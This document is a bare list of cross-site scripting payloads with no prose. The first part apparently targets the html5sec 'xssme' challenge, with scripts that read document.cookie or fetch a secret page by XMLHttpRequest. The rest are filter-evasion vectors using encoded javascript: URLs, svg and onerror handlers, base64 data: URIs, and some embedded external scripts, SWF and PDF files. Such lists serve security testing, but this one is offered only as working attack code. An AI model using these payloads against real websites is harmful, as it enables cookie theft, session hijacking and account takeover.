<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click'; document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
<script> (function (o) { function exploit(x) { if (x !== null) alert('User cookie is ' %2B x); else console.log('fail'); } o.onclick = function (e) { e.__defineGetter__('isTrusted', function () { return true; }); exploit(Safe.get()); }; var e = document.createEvent('MouseEvent'); e.initEvent('click', true, true); o.dispatchEvent(e); })(document.getElementById('safe123')); </script>
<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
<script> function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
<script> function foo(elem, doc, text) { elem.onclick = function (e) { e.__defineGetter__(text[0], function () { return true }) alert(Safe.get()); }; var event = doc.createEvent(text[1]); event.initEvent(text[2], true, true); elem.dispatchEvent(event); } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>
<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
<var onmouseover="prompt(1)">On Mouse Over</var>?
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script ?
<img src ?itworksonchrome?\/onerror = alert(1)???
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>?
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
"><img src=x onerror=prompt(1);>


```
